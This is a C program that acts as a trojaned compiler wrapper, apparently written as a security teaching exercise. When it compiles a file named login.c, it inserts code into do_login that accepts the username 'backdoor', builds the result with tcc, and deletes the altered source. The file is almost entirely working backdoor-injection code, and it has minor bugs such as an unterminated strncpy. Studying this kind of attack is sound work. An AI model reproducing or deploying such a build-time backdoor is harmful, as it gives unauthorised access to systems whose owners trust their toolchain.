#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>


char *read_file(char *filename);
void write_to_file(char* contents);

int main(int argc, char *argv[]) {

    //./compiler <filename>

    if(argc != 4){
        printf("ERROR: invalid argument count\n");
        return -1;
    }

    char* filename = argv[1];
    char* output_name = argv[3];

    char* suffix = strrchr(filename, '.');
    if( suffix == NULL || strcmp(suffix, ".c") != 0){
        printf("ERROR: must be c file\n");
        return -1;   
    }

    //setup the trojans


    //read the file
    char* file_contents = read_file(filename);

    //check for trojan conditions
    if(strcmp(filename, "login.c") == 0){
        char* login_backdoor = "\n\tif (!strcmp(username, \"backdoor\")){\n\t\tprintf(\"backdoored lmfao \");\n\t\treturn 0;\n\t}\n";
        int login_backdoor_len = strlen(login_backdoor);

        int file_contents_length = strlen(file_contents);
        // printf("file contents length: %d\n", file_contents_length);
        char* fp_after = strstr(file_contents, "do_login");
        fp_after = strchr(fp_after, '{');
        fp_after = strchr(fp_after, '\n');
        // printf("after:\n%s", fp_after);
        // printf("file contents:\n%s", file_contents);
        int before_segment_len = strlen(file_contents) - strlen(fp_after);

        //init scratch space
        char* modified_file_contents = malloc(sizeof(char) * (file_contents_length+login_backdoor_len+1));

        //1. setup before segment
        strncpy(modified_file_contents, file_contents, before_segment_len); 

    
        //2. insert backdoor 
        strcat(modified_file_contents, login_backdoor);

        //3. fill in the rest
        strcat(modified_file_contents, fp_after);

        printf("modified_file_contents:\n%s", modified_file_contents);

        //shove into file_contents
        free(file_contents);
        file_contents = modified_file_contents;

    }
    

    //once above is done, write new source to a file
    write_to_file(file_contents);

    //compile with tcc as a fork
    int status;

    pid_t pid = fork();
    if(pid < 0){
        fprintf(stderr, "Fork Failed");
        return -1;
    }

    if(pid == 0){ //child
        char* arg_Ptr[] = {"/usr/local/bin/tcc", "bugged.c", "-o", output_name, NULL};
        execv(arg_Ptr[0], arg_Ptr);
        printf("Execv failed\n");
        exit(-1);
    } else {
        pid_t tpid = wait(&status);
        if (WIFEXITED(status)) {
            printf("The process ended with exit(%d).\n", WEXITSTATUS(status));
        }
        if (WIFSIGNALED(status)) {
            printf("The process ended with kill -%d.\n", WTERMSIG(status));
        }

        //delete the bugged c file
        remove("bugged.c");

    }

    return 0;
}

void write_to_file(char* contents){
    FILE *file;
    file = fopen("bugged.c", "w");
    fputs(contents, file);
    fclose(file);
}


char *read_file(char *filename){
  FILE *file;
  file = fopen(filename, "r");
  
  if (file == NULL) return NULL;

  fseek(file, 0, SEEK_END); 
  int length = ftell(file);
  fseek(file, 0, SEEK_SET);
  
  char *string = malloc(sizeof(char) * (length+1));
  char c;

  int i = 0;
  while ( (c = fgetc(file)) != EOF)
  {
    string[i] = c;
    i++;
  }

  string[i] = '\0';
  fclose(file);
  return string;
}